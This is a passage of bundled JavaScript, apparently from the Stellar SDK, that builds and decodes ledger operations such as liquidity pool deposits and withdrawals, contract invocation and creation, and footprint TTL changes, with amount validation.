        if (F.maxAmountA = this._toXDRAmount(w),
        !this.isValidAmount(b, !0))
            throw new TypeError(this.constructAmountRequirementsError("maxAmountB"));
        if (F.maxAmountB = this._toXDRAmount(b),
        X === void 0)
            throw new TypeError("minPrice argument is required");
        if (F.minPrice = this._toXDRPrice(X),
        Y === void 0)
            throw new TypeError("maxPrice argument is required");
        F.maxPrice = this._toXDRPrice(Y);
        var V = new _.default.LiquidityPoolDepositOp(F)
          , K = {
            body: _.default.OperationBody.liquidityPoolDeposit(V)
        };
        return this.setSourceAccount(K, O),
        new _.default.Operation(K)
    }
    return liquidity_pool_deposit
}
var liquidity_pool_withdraw = {}, hasRequiredLiquidity_pool_withdraw;
function requireLiquidity_pool_withdraw() {
    if (hasRequiredLiquidity_pool_withdraw)
        return liquidity_pool_withdraw;
    hasRequiredLiquidity_pool_withdraw = 1,
    Object.defineProperty(liquidity_pool_withdraw, "__esModule", {
        value: !0
    }),
    liquidity_pool_withdraw.liquidityPoolWithdraw = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j() {
        var O = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , x = {};
        if (!O.liquidityPoolId)
            throw new TypeError("liquidityPoolId argument is required");
        if (x.liquidityPoolId = _.default.PoolId.fromXDR(O.liquidityPoolId, "hex"),
        !this.isValidAmount(O.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (x.amount = this._toXDRAmount(O.amount),
        !this.isValidAmount(O.minAmountA, !0))
            throw new TypeError(this.constructAmountRequirementsError("minAmountA"));
        if (x.minAmountA = this._toXDRAmount(O.minAmountA),
        !this.isValidAmount(O.minAmountB, !0))
            throw new TypeError(this.constructAmountRequirementsError("minAmountB"));
        x.minAmountB = this._toXDRAmount(O.minAmountB);
        var w = new _.default.LiquidityPoolWithdrawOp(x)
          , b = {
            body: _.default.OperationBody.liquidityPoolWithdraw(w)
        };
        return this.setSourceAccount(b, O),
        new _.default.Operation(b)
    }
    return liquidity_pool_withdraw
}
var invoke_host_function = {}, address = {}, hasRequiredAddress;
function requireAddress() {
    if (hasRequiredAddress)
        return address;
    hasRequiredAddress = 1,
    Object.defineProperty(address, "__esModule", {
        value: !0
    }),
    address.Address = void 0;
    var _ = requireStrkey()
      , M = j(requireXdr());
    function j(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function O(F) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(V) {
            return typeof V
        }
        : function(V) {
            return V && typeof Symbol == "function" && V.constructor === Symbol && V !== Symbol.prototype ? "symbol" : typeof V
        }
        ,
        O(F)
    }
    function x(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    function w(F, V) {
        for (var K = 0; K < V.length; K++) {
            var Q = V[K];
            Q.enumerable = Q.enumerable || !1,
            Q.configurable = !0,
            "value"in Q && (Q.writable = !0),
            Object.defineProperty(F, X(Q.key), Q)
        }
    }
    function b(F, V, K) {
        return V && w(F.prototype, V),
        K && w(F, K),
        Object.defineProperty(F, "prototype", {
            writable: !1
        }),
        F
    }
    function X(F) {
        var V = Y(F, "string");
        return O(V) == "symbol" ? V : V + ""
    }
    function Y(F, V) {
        if (O(F) != "object" || !F)
            return F;
        var K = F[Symbol.toPrimitive];
        if (K !== void 0) {
            var Q = K.call(F, V);
            if (O(Q) != "object")
                return Q;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(F)
    }
    return address.Address = function() {
        function F(V) {
            if (x(this, F),
            _.StrKey.isValidEd25519PublicKey(V))
                this._type = "account",
                this._key = _.StrKey.decodeEd25519PublicKey(V);
            else if (_.StrKey.isValidContract(V))
                this._type = "contract",
                this._key = _.StrKey.decodeContract(V);
            else
                throw new Error("Unsupported address type: ".concat(V))
        }
        return b(F, [{
            key: "toString",
            value: function() {
                switch (this._type) {
                case "account":
                    return _.StrKey.encodeEd25519PublicKey(this._key);
                case "contract":
                    return _.StrKey.encodeContract(this._key);
                default:
                    throw new Error("Unsupported address type")
                }
            }
        }, {
            key: "toScVal",
            value: function() {
                return M.default.ScVal.scvAddress(this.toScAddress())
            }
        }, {
            key: "toScAddress",
            value: function() {
                switch (this._type) {
                case "account":
                    return M.default.ScAddress.scAddressTypeAccount(M.default.PublicKey.publicKeyTypeEd25519(this._key));
                case "contract":
                    return M.default.ScAddress.scAddressTypeContract(this._key);
                default:
                    throw new Error("Unsupported address type")
                }
            }
        }, {
            key: "toBuffer",
            value: function() {
                return this._key
            }
        }], [{
            key: "fromString",
            value: function(K) {
                return new F(K)
            }
        }, {
            key: "account",
            value: function(K) {
                return new F(_.StrKey.encodeEd25519PublicKey(K))
            }
        }, {
            key: "contract",
            value: function(K) {
                return new F(_.StrKey.encodeContract(K))
            }
        }, {
            key: "fromScVal",
            value: function(K) {
                return F.fromScAddress(K.address())
            }
        }, {
            key: "fromScAddress",
            value: function(K) {
                switch (K.switch().value) {
                case M.default.ScAddressType.scAddressTypeAccount().value:
                    return F.account(K.accountId().ed25519());
                case M.default.ScAddressType.scAddressTypeContract().value:
                    return F.contract(K.contractId());
                default:
                    throw new Error("Unsupported address type")
                }
            }
        }])
    }(),
    address
}
var hasRequiredInvoke_host_function;
function requireInvoke_host_function() {
    if (hasRequiredInvoke_host_function)
        return invoke_host_function;
    hasRequiredInvoke_host_function = 1,
    Object.defineProperty(invoke_host_function, "__esModule", {
        value: !0
    }),
    invoke_host_function.createCustomContract = ee,
    invoke_host_function.createStellarAssetContract = ae,
    invoke_host_function.invokeContractFunction = Q,
    invoke_host_function.invokeHostFunction = K,
    invoke_host_function.uploadContractWasm = ne;
    var _ = x(requireXdr())
      , M = requireKeypair()
      , j = requireAddress()
      , O = requireAsset();
    function x(ue) {
        return ue && ue.__esModule ? ue : {
            default: ue
        }
    }
    function w(ue, fe) {
        return V(ue) || F(ue, fe) || X(ue, fe) || b()
    }
    function b() {
        throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
    }
    function X(ue, fe) {
        if (ue) {
            if (typeof ue == "string")
                return Y(ue, fe);
            var he = {}.toString.call(ue).slice(8, -1);
            return he === "Object" && ue.constructor && (he = ue.constructor.name),
            he === "Map" || he === "Set" ? Array.from(ue) : he === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(he) ? Y(ue, fe) : void 0
        }
    }
    function Y(ue, fe) {
        (fe == null || fe > ue.length) && (fe = ue.length);
        for (var he = 0, pe = Array(fe); he < fe; he++)
            pe[he] = ue[he];
        return pe
    }
    function F(ue, fe) {
        var he = ue == null ? null : typeof Symbol < "u" && ue[Symbol.iterator] || ue["@@iterator"];
        if (he != null) {
            var pe, ye, be, xe, Ae = [], Ee = !0, Be = !1;
            try {
                if (be = (he = he.call(ue)).next,
                fe !== 0)
                    for (; !(Ee = (pe = be.call(he)).done) && (Ae.push(pe.value),
                    Ae.length !== fe); Ee = !0)
                        ;
            } catch (ce) {
                Be = !0,
                ye = ce
            } finally {
                try {
                    if (!Ee && he.return != null && (xe = he.return(),
                    Object(xe) !== xe))
                        return
                } finally {
                    if (Be)
                        throw ye
                }
            }
            return Ae
        }
    }
    function V(ue) {
        if (Array.isArray(ue))
            return ue
    }
    function K(ue) {
        if (!ue.func)
            throw new TypeError("host function invocation ('func') required (got ".concat(JSON.stringify(ue), ")"));
        var fe = new _.default.InvokeHostFunctionOp({
            hostFunction: ue.func,
            auth: ue.auth || []
        })
          , he = {
            body: _.default.OperationBody.invokeHostFunction(fe)
        };
        return this.setSourceAccount(he, ue),
        new _.default.Operation(he)
    }
    function Q(ue) {
        var fe = new j.Address(ue.contract);
        if (fe._type !== "contract")
            throw new TypeError("expected contract strkey instance, got ".concat(fe));
        return this.invokeHostFunction({
            source: ue.source,
            auth: ue.auth,
            func: _.default.HostFunction.hostFunctionTypeInvokeContract(new _.default.InvokeContractArgs({
                contractAddress: fe.toScAddress(),
                functionName: ue.function,
                args: ue.args
            }))
        })
    }
    function ee(ue) {
        var fe, he = Buffer.from(ue.salt || oe());
        if (!ue.wasmHash || ue.wasmHash.length !== 32)
            throw new TypeError("expected hash(contract WASM) in 'opts.wasmHash', got ".concat(ue.wasmHash));
        if (he.length !== 32)
            throw new TypeError("expected 32-byte salt in 'opts.salt', got ".concat(ue.wasmHash));
        return this.invokeHostFunction({
            source: ue.source,
            auth: ue.auth,
            func: _.default.HostFunction.hostFunctionTypeCreateContractV2(new _.default.CreateContractArgsV2({
                executable: _.default.ContractExecutable.contractExecutableWasm(Buffer.from(ue.wasmHash)),
                contractIdPreimage: _.default.ContractIdPreimage.contractIdPreimageFromAddress(new _.default.ContractIdPreimageFromAddress({
                    address: ue.address.toScAddress(),
                    salt: he
                })),
                constructorArgs: (fe = ue.constructorArgs) !== null && fe !== void 0 ? fe : []
            }))
        })
    }
    function ae(ue) {
        var fe = ue.asset;
        if (typeof fe == "string") {
            var he = fe.split(":")
              , pe = w(he, 2)
              , ye = pe[0]
              , be = pe[1];
            fe = new O.Asset(ye,be)
        }
        if (!(fe instanceof O.Asset))
            throw new TypeError("expected Asset in 'opts.asset', got ".concat(fe));
        return this.invokeHostFunction({
            source: ue.source,
            auth: ue.auth,
            func: _.default.HostFunction.hostFunctionTypeCreateContract(new _.default.CreateContractArgs({
                executable: _.default.ContractExecutable.contractExecutableStellarAsset(),
                contractIdPreimage: _.default.ContractIdPreimage.contractIdPreimageFromAsset(fe.toXDRObject())
            }))
        })
    }
    function ne(ue) {
        return this.invokeHostFunction({
            source: ue.source,
            auth: ue.auth,
            func: _.default.HostFunction.hostFunctionTypeUploadContractWasm(Buffer.from(ue.wasm))
        })
    }
    function oe() {
        return M.Keypair.random().xdrPublicKey().value()
    }
    return invoke_host_function
}
var extend_footprint_ttl = {}, hasRequiredExtend_footprint_ttl;
function requireExtend_footprint_ttl() {
    if (hasRequiredExtend_footprint_ttl)
        return extend_footprint_ttl;
    hasRequiredExtend_footprint_ttl = 1,
    Object.defineProperty(extend_footprint_ttl, "__esModule", {
        value: !0
    }),
    extend_footprint_ttl.extendFootprintTtl = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j(O) {
        var x;
        if (((x = O.extendTo) !== null && x !== void 0 ? x : -1) <= 0)
            throw new RangeError("extendTo has to be positive");
        var w = new _.default.ExtendFootprintTtlOp({
            ext: new _.default.ExtensionPoint(0),
            extendTo: O.extendTo
        })
          , b = {
            body: _.default.OperationBody.extendFootprintTtl(w)
        };
        return this.setSourceAccount(b, O),
        new _.default.Operation(b)
    }
    return extend_footprint_ttl
}
var restore_footprint = {}, hasRequiredRestore_footprint;
function requireRestore_footprint() {
    if (hasRequiredRestore_footprint)
        return restore_footprint;
    hasRequiredRestore_footprint = 1,
    Object.defineProperty(restore_footprint, "__esModule", {
        value: !0
    }),
    restore_footprint.restoreFootprint = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j() {
        var O = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , x = new _.default.RestoreFootprintOp({
            ext: new _.default.ExtensionPoint(0)
        })
          , w = {
            body: _.default.OperationBody.restoreFootprint(x)
        };
        return this.setSourceAccount(w, O ?? {}),
        new _.default.Operation(w)
    }
    return restore_footprint
}
var hasRequiredOperations;
function requireOperations() {
    return hasRequiredOperations || (hasRequiredOperations = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        Object.defineProperty(_, "accountMerge", {
            enumerable: !0,
            get: function() {
                return O.accountMerge
            }
        }),
        Object.defineProperty(_, "allowTrust", {
            enumerable: !0,
            get: function() {
                return x.allowTrust
            }
        }),
        Object.defineProperty(_, "beginSponsoringFutureReserves", {
            enumerable: !0,
            get: function() {
                return fe.beginSponsoringFutureReserves
            }
        }),
        Object.defineProperty(_, "bumpSequence", {
            enumerable: !0,
            get: function() {
                return w.bumpSequence
            }
        }),
        Object.defineProperty(_, "changeTrust", {
            enumerable: !0,
            get: function() {
                return b.changeTrust
            }
        }),
        Object.defineProperty(_, "claimClaimableBalance", {
            enumerable: !0,
            get: function() {
                return F.claimClaimableBalance
            }
        }),
        Object.defineProperty(_, "clawback", {
            enumerable: !0,
            get: function() {
                return ye.clawback
            }
        }),
        Object.defineProperty(_, "clawbackClaimableBalance", {
            enumerable: !0,
            get: function() {
                return V.clawbackClaimableBalance
            }
        }),
        Object.defineProperty(_, "createAccount", {
            enumerable: !0,
            get: function() {
                return X.createAccount
            }
        }),
        Object.defineProperty(_, "createClaimableBalance", {
            enumerable: !0,
            get: function() {
                return Y.createClaimableBalance
            }
        }),
        Object.defineProperty(_, "createCustomContract", {
            enumerable: !0,
            get: function() {
                return Ee.createCustomContract
            }
        }),
        Object.defineProperty(_, "createPassiveSellOffer", {
            enumerable: !0,
            get: function() {
                return j.createPassiveSellOffer
            }
        }),
        Object.defineProperty(_, "createStellarAssetContract", {
            enumerable: !0,
            get: function() {
                return Ee.createStellarAssetContract
            }
        }),
        Object.defineProperty(_, "endSponsoringFutureReserves", {
            enumerable: !0,
            get: function() {
                return he.endSponsoringFutureReserves
            }
        }),
        Object.defineProperty(_, "extendFootprintTtl", {
            enumerable: !0,
            get: function() {
                return Be.extendFootprintTtl
            }
        }),
        Object.defineProperty(_, "inflation", {
            enumerable: !0,
            get: function() {
                return K.inflation
            }
        }),
        Object.defineProperty(_, "invokeContractFunction", {
            enumerable: !0,
            get: function() {
                return Ee.invokeContractFunction
            }
        }),
        Object.defineProperty(_, "invokeHostFunction", {
            enumerable: !0,
            get: function() {
                return Ee.invokeHostFunction
            }
        }),
        Object.defineProperty(_, "liquidityPoolDeposit", {
            enumerable: !0,
            get: function() {
                return xe.liquidityPoolDeposit
            }
        }),
        Object.defineProperty(_, "liquidityPoolWithdraw", {
            enumerable: !0,
            get: function() {
                return Ae.liquidityPoolWithdraw
            }
        }),
        Object.defineProperty(_, "manageBuyOffer", {
            enumerable: !0,
            get: function() {
                return ee.manageBuyOffer
            }
        }),
        Object.defineProperty(_, "manageData", {
            enumerable: !0,
            get: function() {
                return Q.manageData
            }
        }),
        Object.defineProperty(_, "manageSellOffer", {
            enumerable: !0,
            get: function() {
                return M.manageSellOffer
            }
        }),
        Object.defineProperty(_, "pathPaymentStrictReceive", {
            enumerable: !0,
            get: function() {
                return ae.pathPaymentStrictReceive
            }
        }),
        Object.defineProperty(_, "pathPaymentStrictSend", {
            enumerable: !0,
            get: function() {
                return ne.pathPaymentStrictSend
            }
        }),
        Object.defineProperty(_, "payment", {
            enumerable: !0,
            get: function() {
                return oe.payment
            }
        }),
        Object.defineProperty(_, "restoreFootprint", {
            enumerable: !0,
            get: function() {
                return ce.restoreFootprint
            }
        }),
        Object.defineProperty(_, "revokeAccountSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeAccountSponsorship
            }
        }),
        Object.defineProperty(_, "revokeClaimableBalanceSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeClaimableBalanceSponsorship
            }
        }),
        Object.defineProperty(_, "revokeDataSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeDataSponsorship
            }
        }),
        Object.defineProperty(_, "revokeLiquidityPoolSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeLiquidityPoolSponsorship
            }
        }),
        Object.defineProperty(_, "revokeOfferSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeOfferSponsorship
            }
        }),
        Object.defineProperty(_, "revokeSignerSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeSignerSponsorship
            }
        }),
        Object.defineProperty(_, "revokeTrustlineSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeTrustlineSponsorship
            }
        }),
        Object.defineProperty(_, "setOptions", {
            enumerable: !0,
            get: function() {
                return ue.setOptions
            }
        }),
        Object.defineProperty(_, "setTrustLineFlags", {
            enumerable: !0,
            get: function() {
                return be.setTrustLineFlags
            }
        }),
        Object.defineProperty(_, "uploadContractWasm", {
            enumerable: !0,
            get: function() {
                return Ee.uploadContractWasm
            }
        });
        var M = requireManage_sell_offer()
          , j = requireCreate_passive_sell_offer()
          , O = requireAccount_merge()
          , x = requireAllow_trust()
          , w = requireBump_sequence()
          , b = requireChange_trust()
          , X = requireCreate_account()
          , Y = requireCreate_claimable_balance()
          , F = requireClaim_claimable_balance()
          , V = requireClawback_claimable_balance()
          , K = requireInflation()
          , Q = requireManage_data()
          , ee = requireManage_buy_offer()
          , ae = requirePath_payment_strict_receive()
          , ne = requirePath_payment_strict_send()
          , oe = requirePayment()
          , ue = requireSet_options()
          , fe = requireBegin_sponsoring_future_reserves()
          , he = requireEnd_sponsoring_future_reserves()
          , pe = requireRevoke_sponsorship()
          , ye = requireClawback()
          , be = requireSet_trustline_flags()
          , xe = requireLiquidity_pool_deposit()
          , Ae = requireLiquidity_pool_withdraw()
          , Ee = requireInvoke_host_function()
          , Be = requireExtend_footprint_ttl()
          , ce = requireRestore_footprint()
    }(operations)),
    operations
}
var hasRequiredOperation;
function requireOperation() {
    if (hasRequiredOperation)
        return operation;
    hasRequiredOperation = 1,
    Object.defineProperty(operation, "__esModule", {
        value: !0
    }),
    operation.Operation = operation.AuthRevocableFlag = operation.AuthRequiredFlag = operation.AuthImmutableFlag = operation.AuthClawbackEnabledFlag = void 0;
    var _ = requireXdr$1()
      , M = ae(requireBignumber())
      , j = requireUtil()
      , O = requireContinued_fraction()
      , x = requireAsset()
      , w = requireLiquidity_pool_asset()
      , b = requireClaimant()
      , X = requireStrkey()
      , Y = requireLiquidity_pool_id()
      , F = ae(requireXdr())
      , V = ee(requireOperations())
      , K = requireDecode_encode_muxed_account();
    function Q(ce) {
        if (typeof WeakMap != "function")
            return null;
        var q = new WeakMap
          , L = new WeakMap;
        return (Q = function(Z) {
            return Z ? L : q
        }
        )(ce)
    }
    function ee(ce, q) {
        if (ce && ce.__esModule)
            return ce;
        if (ce === null || ne(ce) != "object" && typeof ce != "function")
            return {
                default: ce
            };
        var L = Q(q);
        if (L && L.has(ce))
            return L.get(ce);
        var U = {
            __proto__: null
        }
          , Z = Object.defineProperty && Object.getOwnPropertyDescriptor;
        for (var te in ce)
            if (te !== "default" && {}.hasOwnProperty.call(ce, te)) {
                var se = Z ? Object.getOwnPropertyDescriptor(ce, te) : null;
                se && (se.get || se.set) ? Object.defineProperty(U, te, se) : U[te] = ce[te]
            }
        return U.default = ce,
        L && L.set(ce, U),
        U
    }
    function ae(ce) {
        return ce && ce.__esModule ? ce : {
            default: ce
        }
    }
    function ne(ce) {
        "@babel/helpers - typeof";
        return ne = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(q) {
            return typeof q
        }
        : function(q) {
            return q && typeof Symbol == "function" && q.constructor === Symbol && q !== Symbol.prototype ? "symbol" : typeof q
        }
        ,
        ne(ce)
    }
    function oe(ce, q) {
        if (!(ce instanceof q))
            throw new TypeError("Cannot call a class as a function")
    }
    function ue(ce, q) {
        for (var L = 0; L < q.length; L++) {
            var U = q[L];
            U.enumerable = U.enumerable || !1,
            U.configurable = !0,
            "value"in U && (U.writable = !0),
            Object.defineProperty(ce, he(U.key), U)
        }
    }
    function fe(ce, q, L) {
        return L && ue(ce, L),
        Object.defineProperty(ce, "prototype", {
            writable: !1
        }),
        ce
    }
    function he(ce) {
        var q = pe(ce, "string");
        return ne(q) == "symbol" ? q : q + ""
    }
    function pe(ce, q) {
        if (ne(ce) != "object" || !ce)
            return ce;
        var L = ce[Symbol.toPrimitive];
        if (L !== void 0) {
            var U = L.call(ce, q);
            if (ne(U) != "object")
                return U;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ce)
    }
    var ye = 1e7
      , be = "9223372036854775807";
    operation.AuthRequiredFlag = 1,
    operation.AuthRevocableFlag = 2,
    operation.AuthImmutableFlag = 4,
    operation.AuthClawbackEnabledFlag = 8;
    var xe = operation.Operation = function() {
        function ce() {
            oe(this, ce)
        }
        return fe(ce, null, [{
            key: "setSourceAccount",
            value: function(L, U) {
                if (U.source)
                    try {
                        L.sourceAccount = (0,
                        K.decodeAddressToMuxedAccount)(U.source)
                    } catch {
                        throw new Error("Source address is invalid")
                    }
            }
        }, {
            key: "fromXDRObject",
            value: function(L) {
                var U = {};
                L.sourceAccount() && (U.source = (0,
                K.encodeMuxedAccountToAddress)(L.sourceAccount()));
                var Z = L.body().value()
                  , te = L.body().switch().name;
                switch (te) {
                case "createAccount":
                    {
                        U.type = "createAccount",
                        U.destination = Be(Z.destination()),
                        U.startingBalance = this._fromXDRAmount(Z.startingBalance());
                        break
                    }
                case "payment":
                    {
                        U.type = "payment",
                        U.destination = (0,
                        K.encodeMuxedAccountToAddress)(Z.destination()),
                        U.asset = x.Asset.fromOperation(Z.asset()),
                        U.amount = this._fromXDRAmount(Z.amount());
                        break
                    }
                case "pathPaymentStrictReceive":
                    {
                        U.type = "pathPaymentStrictReceive",
                        U.sendAsset = x.Asset.fromOperation(Z.sendAsset()),
                        U.sendMax = this._fromXDRAmount(Z.sendMax()),
                        U.destination = (0,
                        K.encodeMuxedAccountToAddress)(Z.destination()),
                        U.destAsset = x.Asset.fromOperation(Z.destAsset()),
                        U.destAmount = this._fromXDRAmount(Z.destAmount()),
                        U.path = [];
                        var se = Z.path();
                        Object.keys(se).forEach(function(Te) {
                            U.path.push(x.Asset.fromOperation(se[Te]))
                        });
                        break
                    }
                case "pathPaymentStrictSend":
                    {
                        U.type = "pathPaymentStrictSend",
                        U.sendAsset = x.Asset.fromOperation(Z.sendAsset()),
                        U.sendAmount = this._fromXDRAmount(Z.sendAmount()),
                        U.destination = (0,
                        K.encodeMuxedAccountToAddress)(Z.destination()),
                        U.destAsset = x.Asset.fromOperation(Z.destAsset()),
                        U.destMin = this._fromXDRAmount(Z.destMin()),
                        U.path = [];
                        var de = Z.path();
                        Object.keys(de).forEach(function(Te) {
                            U.path.push(x.Asset.fromOperation(de[Te]))
                        });
                        break
                    }
                case "changeTrust":
                    {
                        switch (U.type = "changeTrust",
                        Z.line().switch()) {
                        case F.default.AssetType.assetTypePoolShare():
                            U.line = w.LiquidityPoolAsset.fromOperation(Z.line());
                            break;
                        default:
                            U.line = x.Asset.fromOperation(Z.line());
                            break
                        }
                        U.limit = this._fromXDRAmount(Z.limit());
                        break
                    }
                case "allowTrust":
                    {
                        U.type = "allowTrust",
                        U.trustor = Be(Z.trustor()),
                        U.assetCode = Z.asset().value().toString(),
                        U.assetCode = (0,
                        j.trimEnd)(U.assetCode, "\0"),
                        U.authorize = Z.authorize();
                        break
                    }
                case "setOptions":
                    {
                        if (U.type = "setOptions",
                        Z.inflationDest() && (U.inflationDest = Be(Z.inflationDest())),
                        U.clearFlags = Z.clearFlags(),
                        U.setFlags = Z.setFlags(),
                        U.masterWeight = Z.masterWeight(),
                        U.lowThreshold = Z.lowThreshold(),
                        U.medThreshold = Z.medThreshold(),
                        U.highThreshold = Z.highThreshold(),
                        U.homeDomain = Z.homeDomain() !== void 0 ? Z.homeDomain().toString("ascii") : void 0,
                        Z.signer()) {
                            var re = {}
                              , $ = Z.signer().key().arm();
                            if ($ === "ed25519")
                                re.ed25519PublicKey = Be(Z.signer().key());
                            else if ($ === "preAuthTx")
                                re.preAuthTx = Z.signer().key().preAuthTx();
                            else if ($ === "hashX")
                                re.sha256Hash = Z.signer().key().hashX();
                            else if ($ === "ed25519SignedPayload") {
                                var ie = Z.signer().key().ed25519SignedPayload();
                                re.ed25519SignedPayload = X.StrKey.encodeSignedPayload(ie.toXDR())
                            }
                            re.weight = Z.signer().weight(),
                            U.signer = re
                        }
                        break
                    }
                case "manageOffer":
                case "manageSellOffer":
                    {
                        U.type = "manageSellOffer",
                        U.selling = x.Asset.fromOperation(Z.selling()),
                        U.buying = x.Asset.fromOperation(Z.buying()),
                        U.amount = this._fromXDRAmount(Z.amount()),
                        U.price = this._fromXDRPrice(Z.price()),
                        U.offerId = Z.offerId().toString();
                        break
                    }
                case "manageBuyOffer":
                    {
                        U.type = "manageBuyOffer",
                        U.selling = x.Asset.fromOperation(Z.selling()),
                        U.buying = x.Asset.fromOperation(Z.buying()),
                        U.buyAmount = this._fromXDRAmount(Z.buyAmount()),
                        U.price = this._fromXDRPrice(Z.price()),
                        U.offerId = Z.offerId().toString();
                        break
                    }
                case "createPassiveOffer":
                case "createPassiveSellOffer":
                    {
                        U.type = "createPassiveSellOffer",
                        U.selling = x.Asset.fromOperation(Z.selling()),
                        U.buying = x.Asset.fromOperation(Z.buying()),
                        U.amount = this._fromXDRAmount(Z.amount()),
                        U.price = this._fromXDRPrice(Z.price());
                        break
                    }
                case "accountMerge":
                    {
                        U.type = "accountMerge",
                        U.destination = (0,
                        K.encodeMuxedAccountToAddress)(Z);
                        break
                    }
                case "manageData":
                    {
                        U.type = "manageData",
                        U.name = Z.dataName().toString("ascii"),
                        U.value = Z.dataValue();
                        break
                    }
                case "inflation":
                    {
                        U.type = "inflation";
                        break
                    }
                case "bumpSequence":
                    {
                        U.type = "bumpSequence",
                        U.bumpTo = Z.bumpTo().toString();
                        break
                    }
                case "createClaimableBalance":
                    {
                        U.type = "createClaimableBalance",
                        U.asset = x.Asset.fromOperation(Z.asset()),
                        U.amount = this._fromXDRAmount(Z.amount()),
                        U.claimants = [],
                        Z.claimants().forEach(function(Te) {
                            U.claimants.push(b.Claimant.fromXDR(Te))
                        });
                        break
                    }
                case "claimClaimableBalance":
                    {
                        U.type = "claimClaimableBalance",
                        U.balanceId = Z.toXDR("hex");
                        break
                    }
                case "beginSponsoringFutureReserves":
                    {
                        U.type = "beginSponsoringFutureReserves",
                        U.sponsoredId = Be(Z.sponsoredId());
                        break
                    }
                case "endSponsoringFutureReserves":
                    {
                        U.type = "endSponsoringFutureReserves";
                        break
                    }
                case "revokeSponsorship":
                    {
                        Ae(Z, U);
                        break
                    }
                case "clawback":
                    {
                        U.type = "clawback",
                        U.amount = this._fromXDRAmount(Z.amount()),
                        U.from = (0,
                        K.encodeMuxedAccountToAddress)(Z.from()),
                        U.asset = x.Asset.fromOperation(Z.asset());
                        break
                    }
                case "clawbackClaimableBalance":
                    {
                        U.type = "clawbackClaimableBalance",
                        U.balanceId = Z.toXDR("hex");
                        break
                    }
                case "setTrustLineFlags":
                    {
                        U.type = "setTrustLineFlags",
                        U.asset = x.Asset.fromOperation(Z.asset()),
                        U.trustor = Be(Z.trustor());
                        var ve = Z.clearFlags()
                          , ge = Z.setFlags()
                          , Re = {
                            authorized: F.default.TrustLineFlags.authorizedFlag(),
                            authorizedToMaintainLiabilities: F.default.TrustLineFlags.authorizedToMaintainLiabilitiesFlag(),
                            clawbackEnabled: F.default.TrustLineFlags.trustlineClawbackEnabledFlag()
                        }
                          , Pe = function(Le) {
                            var Ze = Re[Le].value;
                            if (ge & Ze)
                                return !0;
                            if (ve & Ze)
                                return !1
                        };
                        U.flags = {},
                        Object.keys(Re).forEach(function(Te) {
                            U.flags[Te] = Pe(Te)
                        });
                        break
                    }
                case "liquidityPoolDeposit":
                    {
                        U.type = "liquidityPoolDeposit",
                        U.liquidityPoolId = Z.liquidityPoolId().toString("hex"),
                        U.maxAmountA = this._fromXDRAmount(Z.maxAmountA()),
                        U.maxAmountB = this._fromXDRAmount(Z.maxAmountB()),
                        U.minPrice = this._fromXDRPrice(Z.minPrice()),
                        U.maxPrice = this._fromXDRPrice(Z.maxPrice());
                        break
                    }
                case "liquidityPoolWithdraw":
                    {
                        U.type = "liquidityPoolWithdraw",
                        U.liquidityPoolId = Z.liquidityPoolId().toString("hex"),
                        U.amount = this._fromXDRAmount(Z.amount()),
                        U.minAmountA = this._fromXDRAmount(Z.minAmountA()),
                        U.minAmountB = this._fromXDRAmount(Z.minAmountB());
                        break
                    }
                case "invokeHostFunction":
                    {
                        var Ie;
                        U.type = "invokeHostFunction",
                        U.func = Z.hostFunction(),
                        U.auth = (Ie = Z.auth()) !== null && Ie !== void 0 ? Ie : [];
                        break
                    }
                case "extendFootprintTtl":
                    {
                        U.type = "extendFootprintTtl",
                        U.extendTo = Z.extendTo();
                        break
                    }
                case "restoreFootprint":
                    {
                        U.type = "restoreFootprint";
                        break
                    }
                default:
                    throw new Error("Unknown operation: ".concat(te))
                }
                return U
            }
        }, {
            key: "isValidAmount",
            value: function(L) {
                var U = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1;
                if (typeof L != "string")
                    return !1;
                var Z;
                try {
                    Z = new M.default(L)
                } catch {
                    return !1
                }
                return !(!U && Z.isZero() || Z.isNegative() || Z.times(ye).gt(new M.default(be).toString()) || Z.decimalPlaces() > 7 || Z.isNaN() || !Z.isFinite())
            }
        }, {
            key: "constructAmountRequirementsError",
            value: function(L) {
                return "".concat(L, " argument must be of type String, represent a positive number and have at most 7 digits after the decimal")
            }
        }, {
            key: "_checkUnsignedIntValue",
            value: function(L, U) {
                var Z = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : null;
                if (!(typeof U > "u"))
                    switch (typeof U == "string" && (U = parseFloat(U)),
                    !0) {
                    case (typeof U != "number" || !Number.isFinite(U) || U % 1 !== 0):
                        throw new Error("".concat(L, " value is invalid"));
                    case U < 0:
                        throw new Error("".concat(L, " value must be unsigned"));
                    case (!Z || Z && Z(U, L)):
                        return U;
                    default:
                        throw new Error("".concat(L, " value is invalid"))
                    }
            }
        }, {
            key: "_toXDRAmount",
            value: function(L) {
                var U = new M.default(L).times(ye);
                return _.Hyper.fromString(U.toString())
            }
        }, {
            key: "_fromXDRAmount",
            value: function(L) {
                return new M.default(L).div(ye).toFixed(7)
            }
